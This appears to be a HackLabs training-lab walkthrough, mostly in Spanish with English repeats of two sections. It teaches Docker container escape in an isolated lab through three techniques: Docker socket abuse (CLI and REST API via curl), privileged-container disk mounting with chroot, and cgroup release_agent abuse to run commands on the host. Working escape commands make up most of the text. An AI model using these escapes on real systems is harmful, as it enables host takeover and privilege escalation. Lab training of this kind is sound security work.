Descripcion del lab

Este laboratorio usa un escenario Docker-in-Docker aislado para practicar Container Escape sin depender del contenedor principal de HackLabs.

Objetivo: entrar al contenedor victima, validar acceso al socket Docker y ejecutar tecnicas de escape sobre el host del escenario ad-hoc.

Inicio rapido
# 1) Levanta el entorno ad-hoc aislado (desde la carpeta del proyecto)
docker compose -f docker-compose.docker-escape.yml up -d --build

# 2) Entra al contenedor victima del lab
docker exec -it hacklabs-escape-victim sh

Reconocimiento del contenedor victima

Ejecuta estas comprobaciones dentro de hacklabs-escape-victim para confirmar que el entorno de explotacion esta listo:

# 1) Confirmar contenedor
ls /.dockerenv && echo "DENTRO del contenedor"

# 2) Confirmar socket Docker
ls -la /var/run/docker.sock

# 3) Confirmar daemon Docker
curl --unix-socket /var/run/docker.sock http://localhost/_ping

# 4) Confirmar CLI Docker
which docker

Nota: el host accesible tras el escape es el del escenario ad-hoc aislado, no el sistema operativo principal que ejecuta HackLabs.

Prerequisito — Escenario Ad-Hoc aislado (recomendado)

Si el contenedor principal no tiene /var/run/docker.sock o docker, usa este escenario aislado con Docker-in-Docker. No toca el entorno principal de HackLabs.

# 1) Levanta el entorno ad-hoc aislado (desde la carpeta del proyecto):
  docker compose -f docker-compose.docker-escape.yml up -d --build

  # 2) Entra al contenedor víctima del lab:
  docker exec -it hacklabs-escape-victim sh

Easy — Docker Socket Escape

El socket de Docker está montado dentro del contenedor. Cualquier proceso con acceso al socket puede lanzar contenedores privilegiados en el host.

  1. Verifica que estás en un contenedor: 
    # Método fiable (funciona en cgroupsv1 y cgroupsv2):
ls /.dockerenv && echo "DENTRO del contenedor" || echo "no detectado"

# Alternativa (solo cgroupsv1 — en kernels >=6.x puede devolver vacío):
cat /proc/1/cgroup | grep -i docker
  2. Verifica que el socket existe y que el daemon responde: 
    ls -la /var/run/docker.sock
    curl --unix-socket /var/run/docker.sock http://localhost/_ping
    # Socket presente + respuesta OK → daemon accesible
  3. Comprueba si el binario docker está disponible: 
    which docker
# Si no está, usa la API REST via curl (ver paso alternativo)
  4. Escapa montando el filesystem del host en un nuevo contenedor: 
    docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh
  5. Alternativa sin binario docker (API REST): 
    # Comprueba conectividad con el daemon:
curl --unix-socket /var/run/docker.sock http://localhost/_ping

# Lista imágenes disponibles:
curl --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool

# Crea un contenedor privilegiado con el host montado:
curl --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["chroot","/hostfs","sh","-c","cat /root/root.txt"],"Binds":["/:/hostfs"]}' \
  http://localhost/containers/create?name=escape

# Inicia el contenedor y recoge los logs:
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape/start
curl --unix-socket /var/run/docker.sock http://localhost/containers/escape/logs?stdout=1
  6. Desde dentro del chroot tienes acceso completo al host del escenario aislado. Lee la flag del lab: 
    cat /root/root.txt

Medium — Privileged Container Escape

El contenedor corre en modo privileged. Tiene acceso a todos los dispositivos del host.

  1. Comprueba las capacidades efectivas: 
    cat /proc/self/status | grep CapEff
# Si CapEff != 0000000000000000 → privileged
  2. Lista los discos del host y monta el disco principal: 
    fdisk -l
mkdir /tmp/hostdisk
mount /dev/sda1 /tmp/hostdisk
# Si falla sda1, prueba con sda, vda, xvda...
  3. Haz chroot al disco del host para obtener una shell con acceso completo: 
    chroot /tmp/hostdisk
  4. Lee la flag: 
    cat /root/root.txt

Hard — Cgroup release_agent abuse

Técnica avanzada que usa cgroups para ejecutar comandos en el host sin montar discos.

  1. Crea un cgroup y configura el release_agent para apuntar a un script en el host: 
    mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
  2. Crea el script que se ejecutará en el host: 
    echo '#!/bin/sh' > /cmd
echo "cat /root/root.txt > ${host_path}/output" >> /cmd
chmod a+x /cmd
  3. Dispara la ejecución añadiendo un proceso al cgroup y matándolo: 
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
  4. La flag aparecerá en /output: 
    cat /output

Easy — Docker Socket Escape

The Docker socket is mounted inside the container. Any process with socket access can launch privileged containers on the host.

  1. Verify you are inside a container: 
    # Reliable method (works on cgroupsv1 and cgroupsv2):
ls /.dockerenv && echo "INSIDE container" || echo "not detected"

# Alternative (cgroupsv1 only — on kernels >=6.x may return empty):
cat /proc/1/cgroup | grep -i docker
  2. Verify the socket exists and the daemon responds: 
    ls -la /var/run/docker.sock
    curl --unix-socket /var/run/docker.sock http://localhost/_ping
    # Socket present + OK response → daemon reachable
  3. Check if the docker binary is available: 
    which docker
# If not available, use the REST API via curl (see alternative step)
  4. Escape by mounting the host filesystem into a new container: 
    docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh
  5. Alternative without docker binary (REST API): 
    # Verify daemon connectivity:
curl --unix-socket /var/run/docker.sock http://localhost/_ping

# List available images:
curl --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool

# Create a privileged container with host mounted:
curl --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["chroot","/hostfs","sh","-c","cat /root/root.txt"],"Binds":["/:/hostfs"]}' \
  http://localhost/containers/create?name=escape

# Start the container and collect logs:
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape/start
curl --unix-socket /var/run/docker.sock http://localhost/containers/escape/logs?stdout=1
  6. Inside the chroot you have full access to the isolated scenario host. Read the lab flag: 
    cat /root/root.txt

Medium — Privileged Container Escape

The container runs in privileged mode. It has access to all host devices.

  1. Check effective capabilities: 
    cat /proc/self/status | grep CapEff
# If CapEff != 0000000000000000 → privileged
  2. List host disks and mount the main disk: 
    fdisk -l
mkdir /tmp/hostdisk
mount /dev/sda1 /tmp/hostdisk
# If sda1 fails, try sda, vda, xvda...
  3. Chroot into the host disk to get a shell with full access: 
    chroot /tmp/hostdisk
  4. Read the flag: 
    cat /root/root.txt
